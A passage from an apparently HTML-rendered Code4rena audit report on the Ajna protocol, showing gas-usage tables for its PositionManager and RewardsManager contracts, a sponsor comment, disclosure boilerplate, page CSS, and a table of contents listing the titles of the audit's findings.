class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk12\">PositionManager</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> |                 |        |        |         |         |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">|--------------------------------------------------|-----------------|--------|--------|---------|---------|</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">Deployment</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Cost</span><span class=\"mtk1\">                                  | </span><span class=\"mtk12\">Deployment</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Size</span><span class=\"mtk1\"> |        |        |         |         |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk7\">3848238</span><span class=\"mtk1\">                                          | </span><span class=\"mtk7\">19497</span><span class=\"mtk1\">           |        |        |         |         |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk10\">Function</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Name</span><span class=\"mtk1\">                                    | </span><span class=\"mtk12\">min</span><span class=\"mtk1\">             | </span><span class=\"mtk12\">avg</span><span class=\"mtk1\">    | </span><span class=\"mtk12\">median</span><span class=\"mtk1\"> | </span><span class=\"mtk12\">max</span><span class=\"mtk1\">     | # </span><span class=\"mtk12\">calls</span><span class=\"mtk1\"> |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">DOMAIN_SEPARATOR</span><span class=\"mtk1\">                                 | </span><span class=\"mtk7\">512</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">512</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">512</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">512</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">7</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">PERMIT_TYPEHASH</span><span class=\"mtk1\">                                  | </span><span class=\"mtk7\">241</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">241</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">241</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">241</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">7</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)                         | </span><span class=\"mtk7\">25186</span><span class=\"mtk1\">           | </span><span class=\"mtk7\">25186</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">25186</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">25186</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">10</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)                   | </span><span class=\"mtk7\">25186</span><span class=\"mtk1\">           | </span><span class=\"mtk7\">25186</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">25186</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">25186</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">28</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">burn</span><span class=\"mtk1\">                                             | </span><span class=\"mtk7\">1408</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">4679</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">5632</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">8524</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">12</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getLP</span><span class=\"mtk1\">                                            | </span><span class=\"mtk7\">5659</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">7969</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">7200</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">35334</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">229</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getPositionIndexes</span><span class=\"mtk1\">                               | </span><span class=\"mtk7\">1323</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">1921</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">1793</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">3439</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">165</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getPositionIndexesFiltered</span><span class=\"mtk1\">                       | </span><span class=\"mtk7\">8165</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">27877</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">23937</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">71401</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">222</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getPositionInfo</span><span class=\"mtk1\">                                  | </span><span class=\"mtk7\">784</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">784</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">784</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">784</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">4</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">isIndexInPosition</span><span class=\"mtk1\">                                | </span><span class=\"mtk7\">679</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">1242</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">679</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">2679</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">71</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">isPositionBucketBankrupt</span><span class=\"mtk1\">                         | </span><span class=\"mtk7\">5832</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">6624</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">6820</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">7011</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">6</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">memorializePositions</span><span class=\"mtk1\">                             | </span><span class=\"mtk7\">17751</span><span class=\"mtk1\">           | </span><span class=\"mtk7\">324318</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">252840</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">1133268</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">58</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">mint</span><span class=\"mtk1\">                                             | </span><span class=\"mtk7\">8013</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">87149</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">92653</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">97653</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">63</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">moveLiquidity</span><span class=\"mtk1\">                                    | </span><span class=\"mtk7\">5864</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">237889</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">239056</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">675854</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">19</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">ownerOf</span><span class=\"mtk1\">                                          | </span><span class=\"mtk7\">580</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">580</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">580</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">599</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">119</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">permit</span><span class=\"mtk1\">                                           | </span><span class=\"mtk7\">618</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">12225</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">5865</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">32554</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">7</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">poolKey</span><span class=\"mtk1\">                                          | </span><span class=\"mtk7\">523</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">523</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">523</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">523</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">36</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">reedemPositions</span><span class=\"mtk1\">                                  | </span><span class=\"mtk7\">2834</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">37754</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">25381</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">139605</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">24</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">safeTransferFrom</span><span class=\"mtk1\">                                 | </span><span class=\"mtk7\">21520</span><span class=\"mtk1\">           | </span><span class=\"mtk7\">22920</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">23320</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">23520</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">4</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">tokenURI</span><span class=\"mtk1\">                                         | </span><span class=\"mtk7\">2490</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">466347</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">466347</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">930205</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">2</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)            | </span><span class=\"mtk7\">5956</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">18817</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">23476</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">24573</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">12</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)      | </span><span class=\"mtk7\">5956</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">17097</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">19659</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">24573</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">38</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk12\">RewardsManager</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> |                 |         |         |         |         |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">|------------------------------------------------|-----------------|---------|---------|---------|---------|</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">Deployment</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Cost</span><span class=\"mtk1\">                                | </span><span class=\"mtk12\">Deployment</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Size</span><span class=\"mtk1\"> |         |         |         |         |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk7\">1915540</span><span class=\"mtk1\">                                        | </span><span class=\"mtk7\">9863</span><span class=\"mtk1\">            |         |         |         |         |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk10\">Function</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Name</span><span class=\"mtk1\">                                  | </span><span class=\"mtk12\">min</span><span class=\"mtk1\">             | </span><span class=\"mtk12\">avg</span><span class=\"mtk1\">     | </span><span class=\"mtk12\">median</span><span class=\"mtk1\">  | </span><span class=\"mtk12\">max</span><span class=\"mtk1\">     | # </span><span class=\"mtk12\">calls</span><span class=\"mtk1\"> |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">calculateRewards</span><span class=\"mtk1\">                               | </span><span class=\"mtk7\">33122</span><span class=\"mtk1\">           | </span><span class=\"mtk7\">47963</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">36928</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">153466</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">106</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">claimRewards</span><span class=\"mtk1\">                                   | </span><span class=\"mtk7\">523</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">118708</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">102613</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">381560</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">109</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getBucketStateStakeInfo</span><span class=\"mtk1\">                        | </span><span class=\"mtk7\">677</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">2675</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">2677</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">2677</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">81279</span><span class=\"mtk1\">   |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getStakeInfo</span><span class=\"mtk1\">                                   | </span><span class=\"mtk7\">694</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">694</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">694</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">694</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">137</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">moveStakedLiquidity</span><span class=\"mtk1\">                            | </span><span class=\"mtk7\">1856519</span><span class=\"mtk1\">         | </span><span class=\"mtk7\">1968777</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">1968777</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">2081035</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">2</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">stake</span><span class=\"mtk1\">                                          | </span><span class=\"mtk7\">118532</span><span class=\"mtk1\">          | </span><span class=\"mtk7\">374112</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">395151</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">890632</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">34</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">unstake</span><span class=\"mtk1\">                                        | </span><span class=\"mtk7\">95782</span><span class=\"mtk1\">           | </span><span class=\"mtk7\">177074</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">140013</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">395455</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">13</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">updateBucketExchangeRatesAndClaim</span><span class=\"mtk1\">              | </span><span class=\"mtk7\">9593</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">242537</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">174985</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">535123</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">42</span><span class=\"mtk1\">      |</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/284#issuecomment-1574481774\">MikeHathaway (Ajna) commented</a>:</strong></p>\n<blockquote>\n<p>This report was extremely helpful. We’ve adopted many of the gas optimizations, and have verified that the provided gas savings estimates were generally accurate.</p>\n</blockquote>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk6 { color: #D7BA7D; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-11\">High Risk Findings (11)</a></p>\n<ul>\n<li><a href=\"#h-01-positionmanagers-moveliquidity-can-freeze-funds-by-removing-destination-index-even-when-the-move-was-partial\">[H-01] PositionManager’s <code>moveLiquidity</code> can freeze funds by removing destination index even when the move was partial</a></li>\n<li><a href=\"#h-02-positionmanagers-moveliquidity-can-set-wrong-deposit-time-and-permanently-freeze-lp-funds-moved\">[H-02] PositionManager’s <code>moveLiquidity</code> can set wrong deposit time and permanently freeze LP funds moved</a></li>\n<li><a href=\"#h-03-position-nft-can-be-spammed-with-insignificant-positions-by-anyone-until-rewards-dos\">[H-03] Position NFT can be spammed with insignificant positions by anyone until rewards DoS</a></li>\n<li><a href=\"#h-04-delegation-rewards-are-not-counted-toward-granting-fund\">[H-04] Delegation rewards are not counted toward granting fund</a></li>\n<li><a href=\"#h-05-incorrect-calculation-of-the-remaining-updatedrewards-leads-to-possible-underflow-error\">[H-05] Incorrect calculation of the remaining <code>updatedRewards</code> leads to possible underflow error</a></li>\n<li><a href=\"#h-06-the-lender-could-possibly-lose-unclaimed-rewards-in-case-a-bucket-goes-bankrupt\">[H-06] The lender could possibly lose unclaimed rewards in case a bucket goes bankrupt</a></li>\n<li><a href=\"#h-07-user-can-exponentially-increase-the-value-of-their-position-through-the-memorializepositions-function\">[H-07] User can exponentially increase the value of their position through the <code>memorializePositions</code> function</a></li>\n<li><a href=\"#h-08-claiming-accumulated-rewards-while-the-contract-is-underfunded-can-lead-to-a-loss-of-rewards\">[H-08] Claiming accumulated rewards while the contract is underfunded can lead to a loss of rewards</a></li>\n<li><a href=\"#h-09-user-can-avoid-bankrupting-by-calling-positionmanagermoveliquidity-where-to-index-is-bankrupted-index\">[H-09] User can avoid bankrupting by calling <code>PositionManager.moveLiquidity</code> where to index is bankrupted index</a></li>\n<li><a href=\"#h-10-missing-isepochclaimed-validation\">[H-10] missing <code>isEpochClaimed</code> validation</a></li>\n<li><a href=\"#h-11-rewardsmanager-fails-to-validate-pool_-when-updating-exchange-rates-allowing-rewards-to-be-drained\">[H-11] RewardsManager fails to validate <code>pool_</code> when updating exchange rates allowing rewards to be drained</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-14\">Medium Risk Findings (14)</a></p>\n<ul>\n<li><a href=\"#m-01-it-is-possible-to-steal-the-unallocated-part-of-every-delegation-period-budget\">[M-01] It is possible to steal the unallocated part of every delegation period budget</a></li>\n<li><a href=\"#m-02-delegate-rewards-system-is-unfair-to-delegates-with-less-tokens-and-reduces-decentralization\">[M-02] Delegate rewards system is unfair to delegates with less tokens and reduces decentralization</a></li>\n<li><a href=\"#m-03-_updatebucketexchangerateandcalculaterewards-reward-calculation-accuracy-loss\">[M-03] <code>_updateBucketExchangeRateAndCalculateRewards</code> reward calculation accuracy loss</a></li>\n<li><a href=\"#m-04-potential-unfair-distribution-of-rewards-due-to-mev-in-updatebucketexchangeratesandclaim\">[M-04] Potential unfair distribution of Rewards due to MEV in <code>updateBucketExchangeRatesAndClaim</code></a></li>\n<li><a href=\"#m-05-calculating-new-rewards-is-susceptible-to-precision-loss-due-to-division-before-multiplication\">[M-05] Calculating new rewards is susceptible to precision loss due to division before multiplication</a></li>\n<li><a href=\"#m-06-an-optimizer-bug-in-positionmanagergetpositionindexesfiltered\">[M-06] An Optimizer Bug in <code>PositionManager.getPositionIndexesFiltered</code></a></li>\n<li><a href=\"#m-07-calling-standardfundingscreeningvote-function-and-extraordinaryfundingvoteextraordinary-function-when-blocknumber-equals-respective-start-block-and-when-blocknumber-is-bigger-than-respective-start-block-can-result-in-different-available-votes-for-same-voter\">[M-07] Calling <code>StandardFunding.screeningVote</code> function and <code>ExtraordinaryFunding.voteExtraordinary</code> function when <code>block.number</code> equals respective start block and when <code>block.number</code> is bigger than respective start block can result in different available votes for same voter</a></li>\n<li><a href=\"#m-08-the-voting-thresholds-in-ajnas-extraordinary-funding-mechanism-can-be-manipulated-to-execute-proposals-below-the-expected-threshold\">[M-08] The voting thresholds in Ajna’s Extraordinary Funding Mechanism can be manipulated to execute proposals below the expected threshold</a></li>\n<li><a href=\"#m-09-adversary-can-prevent-the-creation-of-any-extraordinary-funding-proposal-by-frontrunning-proposeextraordinary\">[M-09] Adversary can prevent the creation of any extraordinary funding proposal by frontrunning <code>proposeExtraordinary()</code></a></li>\n<li><a href=\"#m-10-unsafe-casting-from-uint256-to-uint128-in-rewardsmanager\">[M-10] Unsafe casting from <code>uint256</code> to <code>uint128</code> in RewardsManager</a></li>\n<li><a href=\"#m-11-standardfundingfundingvote-should-not-allow-users-who-didnt-vote-in-screening-stage-to-vote\">[M-11] <code>StandardFunding.fundingVote</code> should not allow users who didn’t vote in screening stage to vote</a></li>\n<li><a href=\"#m-12-governance-attack-on-extraordinary-proposals\">[M-12] Governance attack on Extraordinary Proposals</a></li>\n<li><a href=\"#m-13--positionmanager--permiterc721-failure-to-comply-with-the-eip-4494\">[M-13]  <code>PositionManager</code> &#x26; <code>PermitERC721</code> Failure to comply with the EIP-4494</a></li>\n<li><a href=\"#m-14-positionmanagermoveliquidity-could-revert-due-to-underflow\">[M-14] <code>PositionManager.moveLiquidity</code> could revert due to underflow</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#qa-report\">QA REPORT</a></li>\n<li><a href=\"#01-challenge_period_length-distribution_period_length-funding_period_length-and-max_efm_proposal_length-are-hardcoded-based-on-7200-blocks-per-day\">01 <code>CHALLENGE_PERIOD_LENGTH</code>, 